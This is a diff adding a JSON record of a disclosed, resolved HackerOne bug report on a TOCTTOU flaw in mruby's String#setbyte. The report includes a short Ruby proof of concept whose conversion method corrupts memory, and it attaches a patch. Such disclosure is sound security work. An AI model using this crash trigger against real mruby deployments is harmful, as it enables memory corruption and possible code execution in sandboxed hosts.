@@ -1,0 +1,126 @@
+{
+  "id": 181893,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xODE4OTM=",
+  "url": "https://hackerone.com/reports/181893",
+  "title": "TOCTTOU bug in mrb_str_setbyte leading the memory corruption",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2016-11-13T09:43:49.735Z",
+  "submitted_at": "2016-11-13T09:43:49.735Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "raydot",
+    "url": "/raydot",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 15668,
+    "url": "https://hackerone.com/shopify-scripts",
+    "handle": "shopify-scripts",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/d9695107bfcd68eeb1c9e0912b109cdae9a6c00c0bda6fd4cbd6d9bdb828840a"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "shopify-scripts",
+      "twitter_handle": "",
+      "website": "",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2016-12-16T21:35:57.209Z",
+  "bug_reporter_agreed_on_going_public_at": "2016-12-16T21:35:57.180Z",
+  "team_member_agreed_on_going_public_at": "2016-12-16T19:52:36.239Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "The String#setbyte function caches the length of the string before loading the function arguments. Loading function arguments through mrb_get_args can call into ruby code to run type conversion methods (to_i, to_s and the like). A malicious conversion method is able to force the string to be reallocated shorter so that the setbyte goes on to overwrite out of bounds memory.\n\nFollowing is a POC that causes a native crash with under mruby on Mac OS X. I plan to follow up with a reliable RCE exploit against mruby-engine using this vulnerability in the next day or so.\n\n```\n$s = \"9\" + (\"\\n\" * (1024*1024-1))\n$k = []\n\nclass Tmp\n    def to_i\n        $k.push(\"a\"*1024)\n        $s.chomp! ''\n        $s.succ!\n        95\n    end\nend\ntmp = Tmp.new\n$s.setbyte(128, tmp)\nputs $k[0]\n```\n\nAttached is a patch to mruby to resolve this issue.",
+  "weakness": {
+    "id": 70,
+    "name": "Code Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 134443,
+      "file_name": "patch2.diff",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/134/443/1233a0c902fddfd27e2ca6f3de463366105f1a31/patch2.diff?response-content-disposition=attachment%3B%20filename%3D%22patch2.diff%22%3B%20filename%2A%3DUTF-8%27%27patch2.diff&response-content-type=text%2Fx-diff&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2672TXP5%2F20250922%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250922T001630Z&X-Amz-Expires=2464&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIFBmwDDQUjrdjJhinf%2BPozodz2NBZ3ix0Y8C72gnYQ%2BwAiB1ZGS0We0mouO%2FzCEMLuto1WvU398SUNLLODhQNoXNFiqxBQgcEAMaDDAxMzYxOTI3NDg0OSIMhA3wwmG7UKJP9AAGKo4FbP9vJ5gC0u5tjxMKfJmGUvInEf1CNrVtkwLSCE8QLqbaBz5bhdVOMWP5KlwGVPiUtWYs7d77h6ZbeXNCEdBPXnpuS17139h2lSdad8KHRt5CbpY9SX66049DiMVxNA08uU8S1%2BYXH8XU3BGxlkmIBbe5aYq67U6MxsQZjp53Dj6WYqrjDDRntYWlHtbOQ4BbiMRfQlVh2tBNFnwj3Vwmau3IQBMLoqwAI6Or%2FcE1LJr0Oq%2BrX8IuLoy8VDmtY%2FBJYcLyArjgz9RQ7VYZbeOdHXdkI7GQ5DKYoN7T3X506ZanWbQUyKVRwNOhNrbT6VfVWP7x1EtHWLsT4vxQTR0PasMeyB9TSn4dHCQvuP7s9hlNF6zm0kjghZmtmaqQIg83FcxwCskYKt3LQuvlJdCVKg3%2BtK3hseuCEJ2p0HvfujAElfJS79p4DFvUVVVie%2Fpv1baDSDfVQjsHo6D%2BGgbNaVWaHEzvFOif8xb%2Fnw8Sg1cSQNhWk0bk8GiRgzSHrbYHLCMbFj2Cnf8nR2h4sm%2FQobzQsNQTE6tgGhcCaHDk2UAiyF5Ee6iPbonvuImIaZlEJ6yzRQD4uo9q7jcqdZi69MbxXF1QC8Rk9%2BeLctZ5lPveRRRQnpmPkCe9xpKlqM6H0JPk3RhV%2B0NR2t7h64akePhaOcmjg1jRrbi03vD4QvuIUPPm9p1cvn5k4HABpm3s5QWqWQr5MFv1hOSNiSK%2B04ToI5RB5iNbSTASQkzF7%2BZef2jrUVgzn5NO3op%2B0OJBRaMBHgQVaMe5xJUn0gK4UfgkBPq00LjqOeMYvBpW1JpKrTaWejkv0C%2F0jfcHOryQ53qfMWzA6uhkAUOsEmJ%2BkF%2BjTLZyQCs9XAuSSDBsMIeVwcYGOrIBgXU9lwrHyKH50udgPH%2BqkLge1TXo7aEsWD%2B0cJkrWkN2NGW7jdl2zNlZ7Nx%2FTdaKqZHglwKVTU1aS9vxMaFN0Vvp4Az5%2FX4PuNNDgCOaKVD9rKQHbR0Omu1NiPDVfv7sREi1GAtWsu%2Bz0iin4S%2BcvkCV26ke3DPe43AHO6Cjw7YWbbsqibZmbFzAfQ482l%2BkgOaZ6sdPNOfAubg6f7BxQtJRegFlN0XizYJKjRFDJAlRPw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=67ba5d5703785a3dd0b9fdb406cd4ab1c29acdd72bbc111b6a9696b20e262b4c",
+      "file_size": 564,
+      "type": "text/x-diff",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2017-01-15T19:52:36.266Z",
+  "allow_singular_disclosure_after": -273990233.77508146,
+  "singular_disclosure_allowed": true,
+  "vote_count": 23,
+  "voters": [
+    "beched",
+    "dkasak",
+    "mpz",
+    "r3y",
+    "eveeez",
+    "ak1t4",
+    "japz",
+    "paulos__",
+    "zerotoone",
+    "secbughunter",
+    "and 13 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "author_type": "Team"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
